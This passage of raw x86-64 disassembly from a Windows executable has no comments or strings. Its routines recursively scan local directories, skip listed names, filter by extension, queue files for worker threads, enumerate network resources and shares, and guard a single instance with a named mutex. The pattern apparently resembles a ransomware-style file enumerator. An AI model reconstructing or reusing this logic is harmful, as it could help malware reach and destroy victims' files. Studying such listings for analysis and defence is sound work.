   140004e87:	48 8b 0d 72 67 00 00 	mov    0x6772(%rip),%rcx        # 0x14000b600
   140004e8e:	4c 8b c6             	mov    %rsi,%r8
   140004e91:	33 d2                	xor    %edx,%edx
   140004e93:	ff 15 47 82 00 00    	call   *0x8247(%rip)        # 0x14000d0e0
   140004e99:	48 8b bc 24 80 14 00 	mov    0x1480(%rsp),%rdi
   140004ea0:	00 
   140004ea1:	48 8b b4 24 78 14 00 	mov    0x1478(%rsp),%rsi
   140004ea8:	00 
   140004ea9:	4c 8b bc 24 88 14 00 	mov    0x1488(%rsp),%r15
   140004eb0:	00 
   140004eb1:	49 8b ce             	mov    %r14,%rcx
   140004eb4:	ff 15 d6 81 00 00    	call   *0x81d6(%rip)        # 0x14000d090
   140004eba:	48 8b 8d 30 13 00 00 	mov    0x1330(%rbp),%rcx
   140004ec1:	48 33 cc             	xor    %rsp,%rcx
   140004ec4:	e8 17 4b 00 00       	call   0x1400099e0
   140004ec9:	48 81 c4 40 14 00 00 	add    $0x1440,%rsp
   140004ed0:	41 5e                	pop    %r14
   140004ed2:	41 5d                	pop    %r13
   140004ed4:	41 5c                	pop    %r12
   140004ed6:	5b                   	pop    %rbx
   140004ed7:	5d                   	pop    %rbp
   140004ed8:	c3                   	ret
   140004ed9:	cc                   	int3
   140004eda:	cc                   	int3
   140004edb:	cc                   	int3
   140004edc:	cc                   	int3
   140004edd:	cc                   	int3
   140004ede:	cc                   	int3
   140004edf:	cc                   	int3
   140004ee0:	40 53                	rex push %rbx
   140004ee2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ee6:	e8 65 4a 00 00       	call   0x140009950
   140004eeb:	48 8b d8             	mov    %rax,%rbx
   140004eee:	48 85 c0             	test   %rax,%rax
   140004ef1:	74 1d                	je     0x140004f10
   140004ef3:	48 8b cb             	mov    %rbx,%rcx
   140004ef6:	e8 c5 f9 ff ff       	call   0x1400048c0
   140004efb:	48 8b cb             	mov    %rbx,%rcx
   140004efe:	e8 8d 48 00 00       	call   0x140009790
   140004f03:	e8 48 4a 00 00       	call   0x140009950
   140004f08:	48 8b d8             	mov    %rax,%rbx
   140004f0b:	48 85 c0             	test   %rax,%rax
   140004f0e:	75 e3                	jne    0x140004ef3
   140004f10:	33 c9                	xor    %ecx,%ecx
   140004f12:	ff 15 58 81 00 00    	call   *0x8158(%rip)        # 0x14000d070
   140004f18:	cc                   	int3
   140004f19:	cc                   	int3
   140004f1a:	cc                   	int3
   140004f1b:	cc                   	int3
   140004f1c:	cc                   	int3
   140004f1d:	cc                   	int3
   140004f1e:	cc                   	int3
   140004f1f:	cc                   	int3
   140004f20:	41 54                	push   %r12
   140004f22:	41 56                	push   %r14
   140004f24:	41 57                	push   %r15
   140004f26:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140004f2d:	48 8b 05 cc 60 00 00 	mov    0x60cc(%rip),%rax        # 0x14000b000
   140004f34:	48 33 c4             	xor    %rsp,%rax
   140004f37:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   140004f3e:	00 
   140004f3f:	4c 8b e1             	mov    %rcx,%r12
   140004f42:	48 8b 0d b7 66 00 00 	mov    0x66b7(%rip),%rcx        # 0x14000b600
   140004f49:	ba 08 00 00 00       	mov    $0x8,%edx
   140004f4e:	41 b8 40 00 01 00    	mov    $0x10040,%r8d
   140004f54:	ff 15 8e 81 00 00    	call   *0x818e(%rip)        # 0x14000d0e8
   140004f5a:	4c 8b f0             	mov    %rax,%r14
   140004f5d:	48 85 c0             	test   %rax,%rax
   140004f60:	74 e0                	je     0x140004f42
   140004f62:	49 8b d4             	mov    %r12,%rdx
   140004f65:	48 8b c8             	mov    %rax,%rcx
   140004f68:	ff 15 52 81 00 00    	call   *0x8152(%rip)        # 0x14000d0c0
   140004f6e:	48 8d 15 bb c3 ff ff 	lea    -0x3c45(%rip),%rdx        # 0x140001330
   140004f75:	49 8b ce             	mov    %r14,%rcx
   140004f78:	ff 15 02 81 00 00    	call   *0x8102(%rip)        # 0x14000d080
   140004f7e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004f83:	49 8b ce             	mov    %r14,%rcx
   140004f86:	ff 15 84 80 00 00    	call   *0x8084(%rip)        # 0x14000d010
   140004f8c:	4c 8b f8             	mov    %rax,%r15
   140004f8f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004f93:	0f 84 11 02 00 00    	je     0x1400051aa
   140004f99:	48 89 9c 24 b8 02 00 	mov    %rbx,0x2b8(%rsp)
   140004fa0:	00 
   140004fa1:	48 89 ac 24 c0 02 00 	mov    %rbp,0x2c0(%rsp)
   140004fa8:	00 
   140004fa9:	48 89 b4 24 c8 02 00 	mov    %rsi,0x2c8(%rsp)
   140004fb0:	00 
   140004fb1:	48 89 bc 24 88 02 00 	mov    %rdi,0x288(%rsp)
   140004fb8:	00 
   140004fb9:	4c 89 ac 24 80 02 00 	mov    %r13,0x280(%rsp)
   140004fc0:	00 
   140004fc1:	4c 8d 2d b8 c4 ff ff 	lea    -0x3b48(%rip),%r13        # 0x140001480
   140004fc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004fcf:	00 
   140004fd0:	33 db                	xor    %ebx,%ebx
   140004fd2:	49 8b fd             	mov    %r13,%rdi
   140004fd5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140004fdc:	00 00 00 00 
   140004fe0:	48 8b 17             	mov    (%rdi),%rdx
   140004fe3:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140004fe8:	ff 15 da 80 00 00    	call   *0x80da(%rip)        # 0x14000d0c8
   140004fee:	85 c0                	test   %eax,%eax
   140004ff0:	0f 84 48 01 00 00    	je     0x14000513e
   140004ff6:	ff c3                	inc    %ebx
   140004ff8:	48 83 c7 08          	add    $0x8,%rdi
   140004ffc:	83 fb 1f             	cmp    $0x1f,%ebx
   140004fff:	72 df                	jb     0x140004fe0
   140005001:	49 8b d4             	mov    %r12,%rdx
   140005004:	49 8b ce             	mov    %r14,%rcx
   140005007:	ff 15 b3 80 00 00    	call   *0x80b3(%rip)        # 0x14000d0c0
   14000500d:	48 8d 15 24 c3 ff ff 	lea    -0x3cdc(%rip),%rdx        # 0x140001338
   140005014:	49 8b ce             	mov    %r14,%rcx
   140005017:	ff 15 63 80 00 00    	call   *0x8063(%rip)        # 0x14000d080
   14000501d:	48 8d 54 24 4c       	lea    0x4c(%rsp),%rdx
   140005022:	49 8b ce             	mov    %r14,%rcx
   140005025:	ff 15 55 80 00 00    	call   *0x8055(%rip)        # 0x14000d080
   14000502b:	f6 44 24 20 10       	testb  $0x10,0x20(%rsp)
   140005030:	74 0d                	je     0x14000503f
   140005032:	49 8b ce             	mov    %r14,%rcx
   140005035:	e8 e6 fe ff ff       	call   0x140004f20
   14000503a:	e9 ff 00 00 00       	jmp    0x14000513e
   14000503f:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140005044:	ff 15 e6 7f 00 00    	call   *0x7fe6(%rip)        # 0x14000d030
   14000504a:	8b f8                	mov    %eax,%edi
   14000504c:	83 ef 01             	sub    $0x1,%edi
   14000504f:	0f 88 e9 00 00 00    	js     0x14000513e
   140005055:	48 63 cf             	movslq %edi,%rcx
   140005058:	48 8d 6c 24 4c       	lea    0x4c(%rsp),%rbp
   14000505d:	48 8d 6c 4d 00       	lea    0x0(%rbp,%rcx,2),%rbp
   140005062:	66 83 7d 00 2e       	cmpw   $0x2e,0x0(%rbp)
   140005067:	0f 85 c4 00 00 00    	jne    0x140005131
   14000506d:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140005072:	48 63 cf             	movslq %edi,%rcx
   140005075:	48 8d 15 c4 c2 ff ff 	lea    -0x3d3c(%rip),%rdx        # 0x140001340
   14000507c:	48 8d 0c 48          	lea    (%rax,%rcx,2),%rcx
   140005080:	ff 15 42 80 00 00    	call   *0x8042(%rip)        # 0x14000d0c8
   140005086:	85 c0                	test   %eax,%eax
   140005088:	0f 85 b0 00 00 00    	jne    0x14000513e
   14000508e:	49 8b ce             	mov    %r14,%rcx
   140005091:	ff 15 99 7f 00 00    	call   *0x7f99(%rip)        # 0x14000d030
   140005097:	ff c0                	inc    %eax
   140005099:	48 63 f0             	movslq %eax,%rsi
   14000509c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400050a0:	48 8b 0d 59 65 00 00 	mov    0x6559(%rip),%rcx        # 0x14000b600
   1400050a7:	4c 8d 04 f5 40 00 00 	lea    0x40(,%rsi,8),%r8
   1400050ae:	00 
   1400050af:	ba 08 00 00 00       	mov    $0x8,%edx
   1400050b4:	ff 15 2e 80 00 00    	call   *0x802e(%rip)        # 0x14000d0e8
   1400050ba:	48 8b d8             	mov    %rax,%rbx
   1400050bd:	48 85 c0             	test   %rax,%rax
   1400050c0:	74 de                	je     0x1400050a0
   1400050c2:	49 8b d6             	mov    %r14,%rdx
   1400050c5:	48 8b c8             	mov    %rax,%rcx
   1400050c8:	ff 15 f2 7f 00 00    	call   *0x7ff2(%rip)        # 0x14000d0c0
   1400050ce:	48 8b 0d 73 65 00 00 	mov    0x6573(%rip),%rcx        # 0x14000b648
   1400050d5:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400050da:	ff 15 38 80 00 00    	call   *0x8038(%rip)        # 0x14000d118
   1400050e0:	48 8d 0d 21 65 00 00 	lea    0x6521(%rip),%rcx        # 0x14000b608
   1400050e7:	ff 15 0b 80 00 00    	call   *0x800b(%rip)        # 0x14000d0f8
   1400050ed:	48 63 15 3c 65 00 00 	movslq 0x653c(%rip),%rdx        # 0x14000b630
   1400050f4:	48 8d 0d 0d 65 00 00 	lea    0x650d(%rip),%rcx        # 0x14000b608
   1400050fb:	48 8b 05 3e 65 00 00 	mov    0x653e(%rip),%rax        # 0x14000b640
   140005102:	48 89 1c d0          	mov    %rbx,(%rax,%rdx,8)
   140005106:	8d 42 01             	lea    0x1(%rdx),%eax
   140005109:	99                   	cltd
   14000510a:	f7 3d 24 65 00 00    	idivl  0x6524(%rip)        # 0x14000b634
   140005110:	89 15 1a 65 00 00    	mov    %edx,0x651a(%rip)        # 0x14000b630
   140005116:	ff 15 ec 7f 00 00    	call   *0x7fec(%rip)        # 0x14000d108
   14000511c:	48 8b 0d 15 65 00 00 	mov    0x6515(%rip),%rcx        # 0x14000b638
   140005123:	45 33 c0             	xor    %r8d,%r8d
   140005126:	ba 01 00 00 00       	mov    $0x1,%edx
   14000512b:	ff 15 cf 7f 00 00    	call   *0x7fcf(%rip)        # 0x14000d100
   140005131:	48 83 ed 02          	sub    $0x2,%rbp
   140005135:	83 ef 01             	sub    $0x1,%edi
   140005138:	0f 89 24 ff ff ff    	jns    0x140005062
   14000513e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005143:	49 8b cf             	mov    %r15,%rcx
   140005146:	ff 15 dc 7e 00 00    	call   *0x7edc(%rip)        # 0x14000d028
   14000514c:	85 c0                	test   %eax,%eax
   14000514e:	0f 85 7c fe ff ff    	jne    0x140004fd0
   140005154:	4c 8b ac 24 80 02 00 	mov    0x280(%rsp),%r13
   14000515b:	00 
   14000515c:	49 8b cf             	mov    %r15,%rcx
   14000515f:	48 8b bc 24 88 02 00 	mov    0x288(%rsp),%rdi
   140005166:	00 
   140005167:	48 8b b4 24 c8 02 00 	mov    0x2c8(%rsp),%rsi
   14000516e:	00 
   14000516f:	48 8b ac 24 c0 02 00 	mov    0x2c0(%rsp),%rbp
   140005176:	00 
   140005177:	48 8b 9c 24 b8 02 00 	mov    0x2b8(%rsp),%rbx
   14000517e:	00 
   14000517f:	ff 15 d3 7e 00 00    	call   *0x7ed3(%rip)        # 0x14000d058
   140005185:	49 8b d4             	mov    %r12,%rdx
   140005188:	49 8b ce             	mov    %r14,%rcx
   14000518b:	ff 15 2f 7f 00 00    	call   *0x7f2f(%rip)        # 0x14000d0c0
   140005191:	48 8d 15 b8 c1 ff ff 	lea    -0x3e48(%rip),%rdx        # 0x140001350
   140005198:	49 8b ce             	mov    %r14,%rcx
   14000519b:	ff 15 df 7e 00 00    	call   *0x7edf(%rip)        # 0x14000d080
   1400051a1:	49 8b ce             	mov    %r14,%rcx
   1400051a4:	ff 15 de 7e 00 00    	call   *0x7ede(%rip)        # 0x14000d088
   1400051aa:	48 8b 0d 4f 64 00 00 	mov    0x644f(%rip),%rcx        # 0x14000b600
   1400051b1:	4d 8b c6             	mov    %r14,%r8
   1400051b4:	33 d2                	xor    %edx,%edx
   1400051b6:	ff 15 24 7f 00 00    	call   *0x7f24(%rip)        # 0x14000d0e0
   1400051bc:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   1400051c3:	00 
   1400051c4:	48 33 cc             	xor    %rsp,%rcx
   1400051c7:	e8 14 48 00 00       	call   0x1400099e0
   1400051cc:	48 81 c4 90 02 00 00 	add    $0x290,%rsp
   1400051d3:	41 5f                	pop    %r15
   1400051d5:	41 5e                	pop    %r14
   1400051d7:	41 5c                	pop    %r12
   1400051d9:	c3                   	ret
   1400051da:	cc                   	int3
   1400051db:	cc                   	int3
   1400051dc:	cc                   	int3
   1400051dd:	cc                   	int3
   1400051de:	cc                   	int3
   1400051df:	cc                   	int3
   1400051e0:	48 83 ec 58          	sub    $0x58,%rsp
   1400051e4:	48 8b 05 15 5e 00 00 	mov    0x5e15(%rip),%rax        # 0x14000b000
   1400051eb:	48 33 c4             	xor    %rsp,%rax
   1400051ee:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400051f3:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400051f8:	c7 44 24 40 ff ff ff 	movl   $0xffffffff,0x40(%rsp)
   1400051ff:	ff 
   140005200:	4c 8b c9             	mov    %rcx,%r9
   140005203:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005208:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000520d:	c7 44 24 30 00 40 00 	movl   $0x4000,0x30(%rsp)
   140005214:	00 
   140005215:	33 d2                	xor    %edx,%edx
   140005217:	41 b8 13 00 00 00    	mov    $0x13,%r8d
   14000521d:	ff 15 65 7f 00 00    	call   *0x7f65(%rip)        # 0x14000d188
   140005223:	85 c0                	test   %eax,%eax
   140005225:	0f 85 d1 00 00 00    	jne    0x1400052fc
   14000522b:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   140005230:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   140005234:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140005239:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005240:	48 8b 0d b9 63 00 00 	mov    0x63b9(%rip),%rcx        # 0x14000b600
   140005247:	4c 8d 43 40          	lea    0x40(%rbx),%r8
   14000524b:	ba 08 00 00 00       	mov    $0x8,%edx
   140005250:	ff 15 92 7e 00 00    	call   *0x7e92(%rip)        # 0x14000d0e8
   140005256:	48 8b f8             	mov    %rax,%rdi
   140005259:	48 85 c0             	test   %rax,%rax
   14000525c:	74 e2                	je     0x140005240
   14000525e:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140005263:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140005268:	4c 8b c0             	mov    %rax,%r8
   14000526b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140005270:	ff 15 0a 7f 00 00    	call   *0x7f0a(%rip)        # 0x14000d180
   140005276:	85 c0                	test   %eax,%eax
   140005278:	75 5b                	jne    0x1400052d5
   14000527a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005280:	33 db                	xor    %ebx,%ebx
   140005282:	39 5c 24 40          	cmp    %ebx,0x40(%rsp)
   140005286:	76 31                	jbe    0x1400052b9
   140005288:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000528f:	00 
   140005290:	48 8d 0c 5b          	lea    (%rbx,%rbx,2),%rcx
   140005294:	48 c1 e1 04          	shl    $0x4,%rcx
   140005298:	48 03 cf             	add    %rdi,%rcx
   14000529b:	f6 41 0c 02          	testb  $0x2,0xc(%rcx)
   14000529f:	74 07                	je     0x1400052a8
   1400052a1:	e8 3a ff ff ff       	call   0x1400051e0
   1400052a6:	eb 09                	jmp    0x1400052b1
   1400052a8:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400052ac:	e8 6f fc ff ff       	call   0x140004f20
   1400052b1:	ff c3                	inc    %ebx
   1400052b3:	3b 5c 24 40          	cmp    0x40(%rsp),%ebx
   1400052b7:	72 d7                	jb     0x140005290
   1400052b9:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400052be:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400052c3:	4c 8b c7             	mov    %rdi,%r8
   1400052c6:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400052cb:	ff 15 af 7e 00 00    	call   *0x7eaf(%rip)        # 0x14000d180
   1400052d1:	85 c0                	test   %eax,%eax
   1400052d3:	74 ab                	je     0x140005280
   1400052d5:	48 8b 0d 24 63 00 00 	mov    0x6324(%rip),%rcx        # 0x14000b600
   1400052dc:	4c 8b c7             	mov    %rdi,%r8
   1400052df:	33 d2                	xor    %edx,%edx
   1400052e1:	ff 15 f9 7d 00 00    	call   *0x7df9(%rip)        # 0x14000d0e0
   1400052e7:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400052ec:	ff 15 7e 7e 00 00    	call   *0x7e7e(%rip)        # 0x14000d170
   1400052f2:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400052f7:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400052fc:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140005301:	48 33 cc             	xor    %rsp,%rcx
   140005304:	e8 d7 46 00 00       	call   0x1400099e0
   140005309:	48 83 c4 58          	add    $0x58,%rsp
   14000530d:	c3                   	ret
   14000530e:	cc                   	int3
   14000530f:	cc                   	int3
   140005310:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005315:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000531a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000531f:	57                   	push   %rdi
   140005320:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140005327:	48 8b 05 d2 5c 00 00 	mov    0x5cd2(%rip),%rax        # 0x14000b000
   14000532e:	48 33 c4             	xor    %rsp,%rax
   140005331:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140005338:	00 
   140005339:	33 c0                	xor    %eax,%eax
   14000533b:	48 8b e9             	mov    %rcx,%rbp
   14000533e:	89 44 24 48          	mov    %eax,0x48(%rsp)
   140005342:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140005346:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   14000534a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005350:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140005355:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   14000535b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005360:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140005365:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000536a:	ba 01 00 00 00       	mov    $0x1,%edx
   14000536f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005374:	48 8b cd             	mov    %rbp,%rcx
   140005377:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000537c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005381:	ff 15 19 7e 00 00    	call   *0x7e19(%rip)        # 0x14000d1a0
   140005387:	8b f0                	mov    %eax,%esi
   140005389:	85 c0                	test   %eax,%eax
   14000538b:	74 0b                	je     0x140005398
   14000538d:	3d ea 00 00 00       	cmp    $0xea,%eax
   140005392:	0f 85 b7 00 00 00    	jne    0x14000544f
   140005398:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000539d:	bf 01 00 00 00       	mov    $0x1,%edi
   1400053a2:	39 7c 24 48          	cmp    %edi,0x48(%rsp)
   1400053a6:	0f 82 8e 00 00 00    	jb     0x14000543a
   1400053ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400053b0:	f7 43 08 ff ff ff 7f 	testl  $0x7fffffff,0x8(%rbx)
   1400053b7:	75 6c                	jne    0x140005425
   1400053b9:	48 8b 0b             	mov    (%rbx),%rcx
   1400053bc:	ff 15 6e 7c 00 00    	call   *0x7c6e(%rip)        # 0x14000d030
   1400053c2:	83 f8 02             	cmp    $0x2,%eax
   1400053c5:	7e 5e                	jle    0x140005425
   1400053c7:	48 8b 0b             	mov    (%rbx),%rcx
   1400053ca:	48 8d 15 bf bf ff ff 	lea    -0x4041(%rip),%rdx        # 0x140001390
   1400053d1:	ff 15 f9 7c 00 00    	call   *0x7cf9(%rip)        # 0x14000d0d0
   1400053d7:	85 c0                	test   %eax,%eax
   1400053d9:	74 4a                	je     0x140005425
   1400053db:	48 8d 15 be bf ff ff 	lea    -0x4042(%rip),%rdx        # 0x1400013a0
   1400053e2:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400053e7:	ff 15 d3 7c 00 00    	call   *0x7cd3(%rip)        # 0x14000d0c0
   1400053ed:	48 8b d5             	mov    %rbp,%rdx
   1400053f0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400053f5:	ff 15 85 7c 00 00    	call   *0x7c85(%rip)        # 0x14000d080
   1400053fb:	48 8d 15 36 bf ff ff 	lea    -0x40ca(%rip),%rdx        # 0x140001338
   140005402:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005407:	ff 15 73 7c 00 00    	call   *0x7c73(%rip)        # 0x14000d080
   14000540d:	48 8b 13             	mov    (%rbx),%rdx
   140005410:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005415:	ff 15 65 7c 00 00    	call   *0x7c65(%rip)        # 0x14000d080
   14000541b:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005420:	e8 fb fa ff ff       	call   0x140004f20
   140005425:	48 83 c3 18          	add    $0x18,%rbx
   140005429:	ff c7                	inc    %edi
   14000542b:	3b 7c 24 48          	cmp    0x48(%rsp),%edi
   14000542f:	0f 86 7b ff ff ff    	jbe    0x1400053b0
   140005435:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000543a:	48 8b cb             	mov    %rbx,%rcx
   14000543d:	ff 15 55 7d 00 00    	call   *0x7d55(%rip)        # 0x14000d198
   140005443:	81 fe ea 00 00 00    	cmp    $0xea,%esi
   140005449:	0f 84 01 ff ff ff    	je     0x140005350
   14000544f:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140005456:	00 
   140005457:	48 33 cc             	xor    %rsp,%rcx
   14000545a:	e8 81 45 00 00       	call   0x1400099e0
   14000545f:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   140005466:	00 
   140005467:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   14000546b:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   14000546f:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140005473:	49 8b e3             	mov    %r11,%rsp
   140005476:	5f                   	pop    %rdi
   140005477:	c3                   	ret
   140005478:	cc                   	int3
   140005479:	cc                   	int3
   14000547a:	cc                   	int3
   14000547b:	cc                   	int3
   14000547c:	cc                   	int3
   14000547d:	cc                   	int3
   14000547e:	cc                   	int3
   14000547f:	cc                   	int3
   140005480:	40 55                	rex push %rbp
   140005482:	41 56                	push   %r14
   140005484:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000548b:	48 8b 05 6e 5b 00 00 	mov    0x5b6e(%rip),%rax        # 0x14000b000
   140005492:	48 33 c4             	xor    %rsp,%rax
   140005495:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   14000549a:	45 33 c9             	xor    %r9d,%r9d
   14000549d:	48 8d 15 04 bf ff ff 	lea    -0x40fc(%rip),%rdx        # 0x1400013a8
   1400054a4:	45 33 c0             	xor    %r8d,%r8d
   1400054a7:	33 c9                	xor    %ecx,%ecx
   1400054a9:	ff 15 19 7d 00 00    	call   *0x7d19(%rip)        # 0x14000d1c8
   1400054af:	45 33 f6             	xor    %r14d,%r14d
   1400054b2:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1400054b7:	ff 15 63 7b 00 00    	call   *0x7b63(%rip)        # 0x14000d020
   1400054bd:	48 8b c8             	mov    %rax,%rcx
   1400054c0:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400054c5:	ff 15 ed 7c 00 00    	call   *0x7ced(%rip)        # 0x14000d1b8
   1400054cb:	4c 8d 05 fe be ff ff 	lea    -0x4102(%rip),%r8        # 0x1400013d0
   1400054d2:	33 d2                	xor    %edx,%edx
   1400054d4:	b9 01 00 1f 00       	mov    $0x1f0001,%ecx
   1400054d9:	48 8b e8             	mov    %rax,%rbp
   1400054dc:	ff 15 96 7b 00 00    	call   *0x7b96(%rip)        # 0x14000d078
   1400054e2:	48 85 c0             	test   %rax,%rax
   1400054e5:	0f 85 81 04 00 00    	jne    0x14000596c
   1400054eb:	4c 8d 05 de be ff ff 	lea    -0x4122(%rip),%r8        # 0x1400013d0
   1400054f2:	48 89 9c 24 a0 00 00 	mov    %rbx,0xa0(%rsp)
   1400054f9:	00 
   1400054fa:	33 d2                	xor    %edx,%edx
   1400054fc:	33 c9                	xor    %ecx,%ecx
   1400054fe:	ff 15 5c 7b 00 00    	call   *0x7b5c(%rip)        # 0x14000d060
   140005504:	33 d2                	xor    %edx,%edx
   140005506:	33 c9                	xor    %ecx,%ecx
   140005508:	ff 15 3a 7b 00 00    	call   *0x7b3a(%rip)        # 0x14000d048
   14000550e:	ff 15 dc 7b 00 00    	call   *0x7bdc(%rip)        # 0x14000d0f0
   140005514:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   140005518:	4c 8d 0d d1 be ff ff 	lea    -0x412f(%rip),%r9        # 0x1400013f0
   14000551f:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   140005525:	48 89 05 d4 60 00 00 	mov    %rax,0x60d4(%rip)        # 0x14000b600
   14000552c:	41 3b db             	cmp    %r11d,%ebx
   14000552f:	7e 74                	jle    0x1400055a5
   140005531:	4c 8d 55 08          	lea    0x8(%rbp),%r10
   140005535:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000553c:	00 00 00 00 
   140005540:	49 8b 02             	mov    (%r10),%rax
   140005543:	45 8b c6             	mov    %r14d,%r8d
   140005546:	66 83 38 2d          	cmpw   $0x2d,(%rax)
   14000554a:	75 4d                	jne    0x140005599
   14000554c:	0f 1f 40 00          	nopl   0x0(%rax)
   140005550:	0f b7 50 02          	movzwl 0x2(%rax),%edx
   140005554:	48 83 c0 02          	add    $0x2,%rax
   140005558:	66 83 fa 2d          	cmp    $0x2d,%dx
   14000555c:	74 f2                	je     0x140005550
   14000555e:	66 83 fa 3d          	cmp    $0x3d,%dx
   140005562:	0f 84 bf 02 00 00    	je     0x140005827
   140005568:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000556f:	00 
   140005570:	66 41 3b 11          	cmp    (%r9),%dx
   140005574:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140005578:	0f b7 50 02          	movzwl 0x2(%rax),%edx
   14000557c:	41 0f 44 c8          	cmove  %r8d,%ecx
   140005580:	48 83 c0 02          	add    $0x2,%rax
   140005584:	49 83 c1 02          	add    $0x2,%r9
   140005588:	44 8b c1             	mov    %ecx,%r8d
   14000558b:	66 83 fa 3d          	cmp    $0x3d,%dx
   14000558f:	75 df                	jne    0x140005570
   140005591:	85 c9                	test   %ecx,%ecx
   140005593:	0f 84 8e 02 00 00    	je     0x140005827
   140005599:	41 ff c3             	inc    %r11d
   14000559c:	49 83 c2 08          	add    $0x8,%r10
   1400055a0:	44 3b db             	cmp    %ebx,%r11d
   1400055a3:	7c 9b                	jl     0x140005540
   1400055a5:	48 89 bc 24 b0 00 00 	mov    %rdi,0xb0(%rsp)
   1400055ac:	00 
   1400055ad:	33 d2                	xor    %edx,%edx
   1400055af:	4c 89 a4 24 80 00 00 	mov    %r12,0x80(%rsp)
   1400055b6:	00 
   1400055b7:	33 c9                	xor    %ecx,%ecx
   1400055b9:	4c 89 6c 24 78       	mov    %r13,0x78(%rsp)
   1400055be:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   1400055c4:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
   1400055c9:	ff 15 e1 7b 00 00    	call   *0x7be1(%rip)        # 0x14000d1b0
   1400055cf:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400055d4:	ff 15 be 7a 00 00    	call   *0x7abe(%rip)        # 0x14000d098
   1400055da:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400055de:	8d 0c 40             	lea    (%rax,%rax,2),%ecx
   1400055e1:	44 8d 3c 00          	lea    (%rax,%rax,1),%r15d
   1400055e5:	e8 f6 41 00 00       	call   0x1400097e0
   1400055ea:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   1400055ee:	4c 8d 05 13 be ff ff 	lea    -0x41ed(%rip),%r8        # 0x140001408
   1400055f5:	48 8b d5             	mov    %rbp,%rdx
   1400055f8:	e8 c3 ca ff ff       	call   0x1400020c0
   1400055fd:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140005604:	00 
   140005605:	41 8b ff             	mov    %r15d,%edi
   140005608:	4c 8b e8             	mov    %rax,%r13
